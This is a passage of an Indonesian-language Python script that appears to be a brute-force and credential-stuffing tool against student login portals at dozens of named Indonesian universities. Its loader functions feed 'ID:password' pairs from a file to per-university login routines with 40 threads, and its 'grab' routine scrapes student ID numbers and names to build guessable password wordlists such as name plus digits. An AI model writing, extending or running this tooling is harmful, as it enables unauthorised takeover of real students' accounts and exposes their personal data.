			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ub, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xupi():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(upi, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuajy():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(uajy, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunhas():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unhas, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xipb():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ipb, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xitb():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(itb, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xbinus():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(binus, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xui():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ui, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunsyiah():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unsyiah, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunusa():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unusa, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xmercu():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(mercu, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xusd():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(usd, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuntan():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(untan, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
	
def xugm():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ugm, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuns():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(uns, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xgundar():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(gundar, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuinm():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(uinm, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunila():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unila, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xusu():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(usu, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xteknokrat():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(teknokrat, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuny():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(uny, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunikom():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unikom, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xukdw():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ukdw, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
	
def xumsida():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(umsida, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xuinsuka():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(uinsuka, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xpolinema():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(polinema, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xunair():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unair, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			

def grab():
	print(f"{B}[{W}1{B}]{W}nim : nim {off} : ")
	print(f"{B}[{W}2{B}]{W}nim : nama + Angka {off} : ")
	print(f"{B}[{W}3{B}]{W}nim : Nama + Angka {off} : ")
	print(f"{B}[{W}4{B}]{W}nama : Nama + Angka {off} : ")
	print(f"{B}[{W}5{B}]{W}nama.nama : nama + Angka {off} : ")
	print(f"{B}[{W}6{B}]{W}nama.nama : Nama + Angka {off} : ")
	print(f"{B}[{W}7{B}]{W}nim : nama {off} : ")
	print(f"{B}[{W}8{B}]{W}nama : nama {off} : ")
	_0 = input(f"\n{B}[{W}?{B}]{W} 𝙿𝚒𝚕𝚒𝚑 : ")
	_1 = cut(input(f"{B}[{W}?{B}]{W} 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙻𝚒𝚗𝚔 𝙳𝚊𝚛𝚒 𝚃𝚊𝚑𝚞𝚗 𝚂𝚎𝚖𝚎𝚜𝚝?? : "))
	_2 = input(f"{B}[{W}?{B}]{off}{W} File Save : ")
	_3 = stat(_1)
	if _0 == '1':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == '2':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(__+':'+__+'\n')
					 o_.write(__+':'+'1234\n')
					 o_.write(__+':'+'12345\n')
					 o_.write(__+':'+'123456\n')
					 o_.write(__+':'+'1234567\n')
					 o_.write(__+':'+'12345678\n')
					 o_.write(__+':'+x[0].lower()+'123\n')
					 o_.write(__+':'+x[0].lower()+'1234\n')
					 o_.write(__+':'+x[0].lower()+'12345\n')
					 o_.write(__+':'+x[0].lower()+'123456\n')
					 o_.write(__+':'+x[0].lower()+'1234567\n')
					 o_.write(__+':'+x[0].lower()+'12345678\n')
					 o_.write(__+':'+x[0].lower()+'123456789\n')
					 o_.write(__+':'+x[1].lower()+'123\n')
					 o_.write(__+':'+x[1].lower()+'1234\n')
					 o_.write(__+':'+x[1].lower()+'12345\n')
					 o_.write(__+':'+x[1].lower()+'123456\n')
					 o_.write(__+':'+x[1].lower()+'1234567\n')
					 o_.write(__+':'+x[1].lower()+'12345678\n')
					 o_.write(__+':'+x[1].lower()+'123456789\n')
					 o_.write(__+':'+x[2].lower()+'123\n')
					 o_.write(__+':'+x[2].lower()+'1234\n')
					 o_.write(__+':'+x[2].lower()+'12345\n')
					 o_.write(__+':'+x[2].lower()+'123456\n')
					 o_.write(__+':'+x[2].lower()+'1234567\n')
					 o_.write(__+':'+x[2].lower()+'12345678\n')
					 o_.write(__+':'+x[2].lower()+'123456789\n')
					 o_.write(__+':'+x[0].lower()+'1\n')
					 o_.write(__+':'+x[0].lower()+'2\n')
					 o_.write(__+':'+x[0].lower()+'3\n')
					 o_.write(__+':'+x[0].lower()+'4\n')
					 o_.write(__+':'+x[0].lower()+'5\n')
					 o_.write(__+':'+x[0].lower()+'6\n')
					 o_.write(__+':'+x[0].lower()+'7\n')
					 o_.write(__+':'+x[0].lower()+'8\n')
					 o_.write(__+':'+x[0].lower()+'9\n')
					 o_.write(__+':'+x[0].lower()+'01\n')
					 o_.write(__+':'+x[0].lower()+'02\n')
					 o_.write(__+':'+x[0].lower()+'03\n')
					 o_.write(__+':'+x[0].lower()+'04\n')
					 o_.write(__+':'+x[0].lower()+'05\n')
					 o_.write(__+':'+x[0].lower()+'06\n')
					 o_.write(__+':'+x[0].lower()+'07\n')
					 o_.write(__+':'+x[0].lower()+'08\n')
					 o_.write(__+':'+x[0].lower()+'09\n')
					 o_.write(__+':'+x[0].lower()+'10\n')
					 o_.write(__+':'+x[0].lower()+'11\n')
					 o_.write(__+':'+x[0].lower()+'12\n')
					 o_.write(__+':'+x[0].lower()+'13\n')
					 o_.write(__+':'+x[0].lower()+'14\n')
					 o_.write(__+':'+x[0].lower()+'15\n')
					 o_.write(__+':'+x[0].lower()+'16\n')
					 o_.write(__+':'+x[0].lower()+'17\n')
					 o_.write(__+':'+x[0].lower()+'18\n')
					 o_.write(__+':'+x[0].lower()+'19\n')
					 o_.write(__+':'+x[0].lower()+'20\n')
					 o_.write(__+':'+x[0].lower()+'21\n')
					 o_.write(__+':'+x[0].lower()+'22\n')
					 o_.write(__+':'+x[0].lower()+'23\n')
					 o_.write(__+':'+x[0].lower()+'24\n')
					 o_.write(__+':'+x[0].lower()+'25\n')
					 o_.write(__+':'+x[0].lower()+'26\n')
					 o_.write(__+':'+x[0].lower()+'27\n')
					 o_.write(__+':'+x[0].lower()+'28\n')
					 o_.write(__+':'+x[0].lower()+'29\n')
					 o_.write(__+':'+x[0].lower()+'30\n')
					 o_.write(__+':'+x[0].lower()+'31\n')
					 o_.write(__+':'+x[0].lower()+'32\n')
					 o_.write(__+':'+x[1].lower()+'1\n')
					 o_.write(__+':'+x[1].lower()+'2\n')
					 o_.write(__+':'+x[1].lower()+'3\n')
					 o_.write(__+':'+x[1].lower()+'4\n')
					 o_.write(__+':'+x[1].lower()+'5\n')
					 o_.write(__+':'+x[1].lower()+'6\n')
					 o_.write(__+':'+x[1].lower()+'7\n')
					 o_.write(__+':'+x[1].lower()+'8\n')
					 o_.write(__+':'+x[1].lower()+'9\n')
					 o_.write(__+':'+x[1].lower()+'01\n')
					 o_.write(__+':'+x[1].lower()+'02\n')
					 o_.write(__+':'+x[1].lower()+'03\n')
					 o_.write(__+':'+x[1].lower()+'04\n')
					 o_.write(__+':'+x[1].lower()+'05\n')
					 o_.write(__+':'+x[1].lower()+'06\n')
					 o_.write(__+':'+x[1].lower()+'07\n')
					 o_.write(__+':'+x[1].lower()+'08\n')
					 o_.write(__+':'+x[1].lower()+'09\n')
					 o_.write(__+':'+x[1].lower()+'10\n')
					 o_.write(__+':'+x[1].lower()+'11\n')
					 o_.write(__+':'+x[1].lower()+'12\n')
					 o_.write(__+':'+x[1].lower()+'13\n')
					 o_.write(__+':'+x[1].lower()+'14\n')
					 o_.write(__+':'+x[1].lower()+'15\n')
					 o_.write(__+':'+x[1].lower()+'16\n')
					 o_.write(__+':'+x[1].lower()+'17\n')
					 o_.write(__+':'+x[1].lower()+'18\n')
					 o_.write(__+':'+x[1].lower()+'19\n')
					 o_.write(__+':'+x[1].lower()+'20\n')
					 o_.write(__+':'+x[1].lower()+'21\n')
					 o_.write(__+':'+x[1].lower()+'22\n')
					 o_.write(__+':'+x[1].lower()+'23\n')
					 o_.write(__+':'+x[1].lower()+'24\n')
					 o_.write(__+':'+x[1].lower()+'25\n')
					 o_.write(__+':'+x[1].lower()+'26\n')
					 o_.write(__+':'+x[1].lower()+'27\n')
					 o_.write(__+':'+x[1].lower()+'28\n')
					 o_.write(__+':'+x[1].lower()+'29\n')
					 o_.write(__+':'+x[1].lower()+'30\n')
					 o_.write(__+':'+x[1].lower()+'31\n')
					 o_.write(__+':'+x[1].lower()+'32\n')
					 o_.write(__+':'+x[2].lower()+'1\n')
					 o_.write(__+':'+x[2].lower()+'2\n')
					 o_.write(__+':'+x[2].lower()+'3\n')
					 o_.write(__+':'+x[2].lower()+'4\n')
					 o_.write(__+':'+x[2].lower()+'5\n')
					 o_.write(__+':'+x[2].lower()+'6\n')
					 o_.write(__+':'+x[2].lower()+'7\n')
					 o_.write(__+':'+x[2].lower()+'8\n')
					 o_.write(__+':'+x[2].lower()+'9\n')
					 o_.write(__+':'+x[2].lower()+'01\n')
					 o_.write(__+':'+x[2].lower()+'02\n')
					 o_.write(__+':'+x[2].lower()+'03\n')
					 o_.write(__+':'+x[2].lower()+'04\n')
					 o_.write(__+':'+x[2].lower()+'05\n')
					 o_.write(__+':'+x[2].lower()+'06\n')
					 o_.write(__+':'+x[2].lower()+'07\n')
					 o_.write(__+':'+x[2].lower()+'08\n')
					 o_.write(__+':'+x[2].lower()+'09\n')
					 o_.write(__+':'+x[2].lower()+'10\n')
					 o_.write(__+':'+x[2].lower()+'11\n')
					 o_.write(__+':'+x[2].lower()+'12\n')
					 o_.write(__+':'+x[2].lower()+'13\n')
					 o_.write(__+':'+x[2].lower()+'14\n')
					 o_.write(__+':'+x[2].lower()+'15\n')
					 o_.write(__+':'+x[2].lower()+'16\n')
					 o_.write(__+':'+x[2].lower()+'17\n')
					 o_.write(__+':'+x[2].lower()+'18\n')
					 o_.write(__+':'+x[2].lower()+'19\n')
					 o_.write(__+':'+x[2].lower()+'20\n')
					 o_.write(__+':'+x[2].lower()+'21\n')
					 o_.write(__+':'+x[2].lower()+'22\n')
					 o_.write(__+':'+x[2].lower()+'23\n')
					 o_.write(__+':'+x[2].lower()+'24\n')
					 o_.write(__+':'+x[2].lower()+'25\n')
					 o_.write(__+':'+x[2].lower()+'26\n')
					 o_.write(__+':'+x[2].lower()+'27\n')
					 o_.write(__+':'+x[2].lower()+'28\n')
					 o_.write(__+':'+x[2].lower()+'29\n')
					 o_.write(__+':'+x[2].lower()+'30\n')
					 o_.write(__+':'+x[2].lower()+'31\n')
					 o_.write(__+':'+x[2].lower()+'32\n')
			except:
				continue
		done(_2)
	elif _0 == '3':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		akbar = input(f"{B}[{W}?{B}]{W} Masukan Angka : ")
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(__+':'+x[0].title()+'123\n')
					 o_.write(__+':'+x[0].title()+'1234\n')
					 o_.write(__+':'+x[0].title()+'12345\n')
					 o_.write(__+':'+x[0].title()+'123456\n')
					 o_.write(__+':'+x[0].title()+'1234567\n')
					 o_.write(__+':'+x[0].title()+'12345678\n')
					 o_.write(__+':'+x[0].title()+'123456789\n')
					 o_.write(__+':'+x[1].title()+'123\n')
					 o_.write(__+':'+x[1].title()+'1234\n')
					 o_.write(__+':'+x[1].title()+'12345\n')
					 o_.write(__+':'+x[1].title()+'123456\n')
					 o_.write(__+':'+x[1].title()+'1234567\n')
					 o_.write(__+':'+x[1].title()+'12345678\n')
					 o_.write(__+':'+x[1].title()+'123456789\n')
					 o_.write(__+':'+x[2].title()+'123\n')
					 o_.write(__+':'+x[2].title()+'1234\n')
					 o_.write(__+':'+x[2].title()+'12345\n')
					 o_.write(__+':'+x[2].title()+'123456\n')
					 o_.write(__+':'+x[2].title()+'1234567\n')
					 o_.write(__+':'+x[2].title()+'12345678\n')
					 o_.write(__+':'+x[2].title()+'123456789\n')
					 o_.write(__+':'+x[0].title()+'1\n')
					 o_.write(__+':'+x[0].title()+'2\n')
					 o_.write(__+':'+x[0].title()+'3\n')
					 o_.write(__+':'+x[0].title()+'4\n')
					 o_.write(__+':'+x[0].title()+'5\n')
					 o_.write(__+':'+x[0].title()+'6\n')
					 o_.write(__+':'+x[0].title()+'7\n')
					 o_.write(__+':'+x[0].title()+'8\n')
					 o_.write(__+':'+x[0].title()+'9\n')
					 o_.write(__+':'+x[0].title()+'01\n')
					 o_.write(__+':'+x[0].title()+'02\n')
					 o_.write(__+':'+x[0].title()+'03\n')
					 o_.write(__+':'+x[0].title()+'04\n')
					 o_.write(__+':'+x[0].title()+'05\n')
					 o_.write(__+':'+x[0].title()+'06\n')
					 o_.write(__+':'+x[0].title()+'07\n')
					 o_.write(__+':'+x[0].title()+'08\n')
					 o_.write(__+':'+x[0].title()+'09\n')
					 o_.write(__+':'+x[0].title()+'10\n')
					 o_.write(__+':'+x[0].title()+'11\n')
					 o_.write(__+':'+x[0].title()+'12\n')
					 o_.write(__+':'+x[0].title()+'13\n')
					 o_.write(__+':'+x[0].title()+'14\n')
					 o_.write(__+':'+x[0].title()+'15\n')
					 o_.write(__+':'+x[0].title()+'16\n')
					 o_.write(__+':'+x[0].title()+'17\n')
					 o_.write(__+':'+x[0].title()+'18\n')
					 o_.write(__+':'+x[0].title()+'19\n')
					 o_.write(__+':'+x[0].title()+'20\n')
					 o_.write(__+':'+x[0].title()+'21\n')
					 o_.write(__+':'+x[0].title()+'22\n')
					 o_.write(__+':'+x[0].title()+'23\n')
					 o_.write(__+':'+x[0].title()+'24\n')
					 o_.write(__+':'+x[0].title()+'25\n')
					 o_.write(__+':'+x[0].title()+'26\n')
					 o_.write(__+':'+x[0].title()+'27\n')
					 o_.write(__+':'+x[0].title()+'28\n')
					 o_.write(__+':'+x[0].title()+'29\n')
					 o_.write(__+':'+x[0].title()+'30\n')
					 o_.write(__+':'+x[0].title()+'31\n')
					 o_.write(__+':'+x[0].title()+'32\n')
					 o_.write(__+':'+x[1].title()+'1\n')
					 o_.write(__+':'+x[1].title()+'2\n')
					 o_.write(__+':'+x[1].title()+'3\n')
					 o_.write(__+':'+x[1].title()+'4\n')
					 o_.write(__+':'+x[1].title()+'5\n')
					 o_.write(__+':'+x[1].title()+'6\n')
					 o_.write(__+':'+x[1].title()+'7\n')
					 o_.write(__+':'+x[1].title()+'8\n')
					 o_.write(__+':'+x[1].title()+'9\n')
					 o_.write(__+':'+x[1].title()+'01\n')
					 o_.write(__+':'+x[1].title()+'02\n')
					 o_.write(__+':'+x[1].title()+'03\n')
					 o_.write(__+':'+x[1].title()+'04\n')
					 o_.write(__+':'+x[1].title()+'05\n')
					 o_.write(__+':'+x[1].title()+'06\n')
					 o_.write(__+':'+x[1].title()+'07\n')
					 o_.write(__+':'+x[1].title()+'08\n')
					 o_.write(__+':'+x[1].title()+'09\n')
					 o_.write(__+':'+x[1].title()+'10\n')
					 o_.write(__+':'+x[1].title()+'11\n')
					 o_.write(__+':'+x[1].title()+'12\n')
					 o_.write(__+':'+x[1].title()+'13\n')
					 o_.write(__+':'+x[1].title()+'14\n')
					 o_.write(__+':'+x[1].title()+'15\n')
					 o_.write(__+':'+x[1].title()+'16\n')
					 o_.write(__+':'+x[1].title()+'17\n')
					 o_.write(__+':'+x[1].title()+'18\n')
					 o_.write(__+':'+x[1].title()+'19\n')
					 o_.write(__+':'+x[1].title()+'20\n')
					 o_.write(__+':'+x[1].title()+'21\n')
					 o_.write(__+':'+x[1].title()+'22\n')
					 o_.write(__+':'+x[1].title()+'23\n')
					 o_.write(__+':'+x[1].title()+'24\n')
					 o_.write(__+':'+x[1].title()+'25\n')
					 o_.write(__+':'+x[1].title()+'26\n')
					 o_.write(__+':'+x[1].title()+'27\n')
					 o_.write(__+':'+x[1].title()+'28\n')
					 o_.write(__+':'+x[1].title()+'29\n')
					 o_.write(__+':'+x[1].title()+'30\n')
					 o_.write(__+':'+x[1].title()+'31\n')
					 o_.write(__+':'+x[1].title()+'32\n')
					 o_.write(__+':'+x[2].title()+'1\n')
					 o_.write(__+':'+x[2].title()+'2\n')
					 o_.write(__+':'+x[2].title()+'3\n')
					 o_.write(__+':'+x[2].title()+'4\n')
					 o_.write(__+':'+x[2].title()+'5\n')
					 o_.write(__+':'+x[2].title()+'6\n')
					 o_.write(__+':'+x[2].title()+'7\n')
					 o_.write(__+':'+x[2].title()+'8\n')
					 o_.write(__+':'+x[2].title()+'9\n')
					 o_.write(__+':'+x[2].title()+'01\n')
					 o_.write(__+':'+x[2].title()+'02\n')
					 o_.write(__+':'+x[2].title()+'03\n')
					 o_.write(__+':'+x[2].title()+'04\n')
					 o_.write(__+':'+x[2].title()+'05\n')
					 o_.write(__+':'+x[2].title()+'06\n')
					 o_.write(__+':'+x[2].title()+'07\n')
					 o_.write(__+':'+x[2].title()+'08\n')
					 o_.write(__+':'+x[2].title()+'09\n')
					 o_.write(__+':'+x[2].title()+'10\n')
					 o_.write(__+':'+x[2].title()+'11\n')
					 o_.write(__+':'+x[2].title()+'12\n')
					 o_.write(__+':'+x[2].title()+'13\n')
					 o_.write(__+':'+x[2].title()+'14\n')
					 o_.write(__+':'+x[2].title()+'15\n')
					 o_.write(__+':'+x[2].title()+'16\n')
					 o_.write(__+':'+x[2].title()+'17\n')
					 o_.write(__+':'+x[2].title()+'18\n')
					 o_.write(__+':'+x[2].title()+'19\n')
					 o_.write(__+':'+x[2].title()+'20\n')
					 o_.write(__+':'+x[2].title()+'21\n')
					 o_.write(__+':'+x[2].title()+'22\n')
					 o_.write(__+':'+x[2].title()+'23\n')
					 o_.write(__+':'+x[2].title()+'24\n')
					 o_.write(__+':'+x[2].title()+'25\n')
					 o_.write(__+':'+x[2].title()+'26\n')
					 o_.write(__+':'+x[2].title()+'27\n')
					 o_.write(__+':'+x[2].title()+'28\n')
					 o_.write(__+':'+x[2].title()+'29\n')
					 o_.write(__+':'+x[2].title()+'30\n')
					 o_.write(__+':'+x[2].title()+'31\n')
					 o_.write(__+':'+x[2].title()+'32\n')
			except:
				continue
		done(_2)
	elif _0 == '4':
